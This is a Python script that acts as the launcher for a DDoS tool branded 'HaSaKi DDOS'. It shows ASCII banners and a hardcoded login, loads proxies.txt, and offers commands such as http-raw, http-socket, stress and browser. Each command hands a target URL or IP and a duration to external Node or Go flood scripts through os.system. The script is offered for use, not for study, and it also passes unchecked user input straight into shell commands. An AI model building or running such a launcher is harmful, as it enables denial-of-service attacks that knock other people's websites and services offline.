from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.GREEN + """UUUUUUUU     UUUUUUUU   SSSSSSSSSSSSSSS EEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   
U::::::U     U::::::U SS:::::::::::::::SE::::::::::::::::::::ER::::::::::::::::R  
U::::::U     U::::::US:::::SSSSSS::::::SE::::::::::::::::::::ER::::::RRRRRR:::::R 
UU:::::U     U:::::UUS:::::S     SSSSSSSEE::::::EEEEEEEEE::::ERR:::::R     R:::::R
 U:::::U     U:::::U S:::::S              E:::::E       EEEEEE  R::::R     R:::::R
 U:::::D     D:::::U S:::::S              E:::::E               R::::R     R:::::R
 U:::::D     D:::::U  S::::SSSS           E::::::EEEEEEEEEE     R::::RRRRRR:::::R 
 U:::::D     D:::::U   SS::::::SSSSS      E:::::::::::::::E     R:::::::::::::RR  
 U:::::D     D:::::U     SSS::::::::SS    E:::::::::::::::E     R::::RRRRRR:::::R 
 U:::::D     D:::::U        SSSSSS::::S   E::::::EEEEEEEEEE     R::::R     R:::::R
 U:::::D     D:::::U             S:::::S  E:::::E               R::::R     R:::::R
 U::::::U   U::::::U             S:::::S  E:::::E       EEEEEE  R::::R     R:::::R
 U:::::::UUU:::::::U SSSSSSS     S:::::SEE::::::EEEEEEEE:::::ERR:::::R     R:::::R
  UU:::::::::::::UU  S::::::SSSSSS:::::SE::::::::::::::::::::ER::::::R     R:::::R
    UU:::::::::UU    S:::::::::::::::SS E::::::::::::::::::::ER::::::R     R:::::R
      UUUUUUUUU       SSSSSSSSSSSSSSS   EEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR
                              TOOL BY VU MINH DUC😘
                              zalo 0962168757 """)
    time.sleep(1.8)
    clear()

def si():
    print("Zalo/Call: 0962168757")
    print("Information: coming soon")

def menu():
    sys.stdout.write(f" tool by VU MINH DUC")
    clear()
    print('  HaSaKi DDOS ')
    print("zalo 0962168757")
    print(Fore.YELLOW + """
\033[1;31m
             ╦ ╦ ╔═╗ ╔═╗ ╔═╗ ╦╔═ ╦
             ╠═╣ ╠═╣ ╚═╗ ╠═╣ ╠╩╗ ║
             ╩ ╩ ╩ ╩ ╚═╝ ╩ ╩ ╩ ╩ ╩
         ╚══╦═════════════════════╦══╝
      ╔═════╩═════════════════════╩══════╗
      ║    Facebook:Vũ Minh Đức          ║
      ║    Zalo:0962168757               ║
      ╚═══════╦═════════════════╦════════╝
          ╔═══╩═════════════════╩═══╗
          ║    Admin:Vũ Minh Đức    ║
          ╚═════════════════════════╝
 +LENH DDOS                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 - http-raw [url]  [time] 
""")

def main():  
    menu()
    while(True):
        cnc = input('''Daoxuanthang@omar: ''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-socket <url> <per> <time>')
                print(Fore.RED +'Example: http-socket huynhthuan.x.programer 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-raw <url> <time>')
                print(Fore.RED +'Example: http-raw huynhthuan.x.programer 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: http-requests <url> <time>')
                print(Fore.RED +'Example: http-requests huynhthuan.x.programer 60')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.RED +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.RED +'MODE: [1] TCP')
                print(Fore.RED +'      [2] UDP')
                print(Fore.RED +'      [3] HTTP')
                print(Fore.RED +'Example: stress 1.1.1.1 80/443 3 1250 60 5')

        elif "browser" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node browser.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Usage: browser <url> <time>')
                print(Fore.RED +'Example: browser huynhthuan.x.programer 60')

        elif "https" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run https.go -site {url} -data {method}')
            except IndexError:
                print(Fore.RED +'Usage: https <url> METHODS<GET/POST>')
                print(Fore.RED +'Example: https huynhthuan.x.programer GET')

        elif "info" in cnc:
            print(f'''
[huynhthuan.x.programer]

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
main()
def login():
    clear()
    user = "HaSaKi"
    passwd = "HaSaKi"
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("Không Làm Mà Đòi Có Ăn")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Chào Thằng Con Cặc")
        time.sleep(3.5)
        ascii_vro()
        main()

login()
